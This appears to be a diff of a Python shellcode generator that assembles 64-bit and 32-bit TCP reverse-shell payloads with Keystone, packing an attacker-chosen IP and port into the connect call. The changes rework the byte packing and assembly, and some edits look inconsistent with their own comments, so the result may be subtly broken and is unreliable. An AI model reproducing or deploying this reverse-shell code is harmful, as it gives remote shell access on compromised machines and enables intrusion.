@@ -10,18 +10,18 @@ def sockaddr(IP, PORT):
        in network byte order for use in generating shellcode.
        Arguments are IP and PORT.'''
 
-    # pack arguments in network byte order
-    inet_family = struct.pack("H", socket.AF_INET)
-    port_bytes  = struct.pack("H", socket.htons(PORT))
-    ip_bytes    = socket.inet_aton(IP)
+    # pack arguments in to be place in the correct order on the stack 
+    ip_bytes    = struct.pack("<I",netaddr.IPAddress(IP).value)
+    port_bytes  = struct.pack("<h", PORT)
+    inet_family = struct.pack(">h", socket.AF_INET)
 
     # combine them in the appropriate order for the connect syscall
-    combine     = inet_family + port_bytes + ip_bytes
+    combine     = ip_bytes + port_bytes + inet_family
 
     # return in the appropriate string format for the shellcode
     return "0x" + binascii.hexlify(combine).decode('utf-8')
 
-def x64_reverse_shell(IP="127.0.0.1", PORT=9000,addr=4198605):
+def x64_reverse_shell(IP,PORT,addr):
     '''x64_reverse_shell(ip(string), port(int), addr(int)) -> bytearray(shellcode)
     
        Generate a 64-bit TCP reverse shell.
@@ -53,13 +53,11 @@ def x64_reverse_shell(IP="127.0.0.1", PORT=9000,addr=4198605):
         "    pop rsi                             ;"
         "    syscall                             ;"   # socket(AF_INET, SOCK_STREAM, 0)
 	"connect:                                ;"
-        "    xchg    eax,    edi                 ;"   # rdi is 2, so moving only al is doable
+        "    xchg    rax,    rdi                 ;"   # rdi is 2, so moving only al is doable
         "    mov al, 42                          ;"
         "    mov rcx, " + address +             ";" + # socket address and port
-        "    neg rcx                             ;"   # negate the value since we provided a negated value (avoiding nulls)
         "    push    rcx                         ;"
-        "    push    rsp                         ;"   # mov rsi,rsp. This is the pointer to sockaddr
-        "    pop rsi                             ;"
+        "    mov    rsi,rsp                      ;"
         "    mov     dl, 16                      ;"   # sockaddr length
         "    syscall                             ;"   # connect(s, addr, len(addr)
 	"dup2:                                   ;"
@@ -83,13 +81,10 @@ def x64_reverse_shell(IP="127.0.0.1", PORT=9000,addr=4198605):
 
     engine = Ks(KS_ARCH_X86, KS_MODE_64)
     shellcode, count = engine.asm(assembly)
-    
-    #print("Number of instructions: {}".format(count))
-    #print("Shellcode length: {}".format(len(shellcode)))
 
     return bytearray(shellcode)
         
-def x32_reverse_shell(IP="127.0.0.1", PORT=9000,addr=4198605):
+def x32_reverse_shell(IP,PORT,addr):
     '''x32_reverse_shell(ip(string), port(int), addr(int)) -> bytearray(shellcode)
     
        Generate a 32-bit TCP reverse shell.
@@ -160,9 +155,6 @@ def x32_reverse_shell(IP="127.0.0.1", PORT=9000,addr=4198605):
     engine = Ks(KS_ARCH_X86, KS_MODE_32)
     shellcode, count = engine.asm(assembly)
     
-    #print("Number of instructions: {}".format(count))
-    #print("Shellcode length: {}".format(len(shellcode)))
-
     return bytearray(shellcode)
 
 def verify_ip(host):
@@ -222,4 +214,4 @@ if __name__ == '__main__':
 
         f.write(shellcode)
 
-    printf("Shellcode successfully compiled and saved as: {}".format(filename))
+    print("Shellcode successfully compiled and saved as: {}".format(args.file))
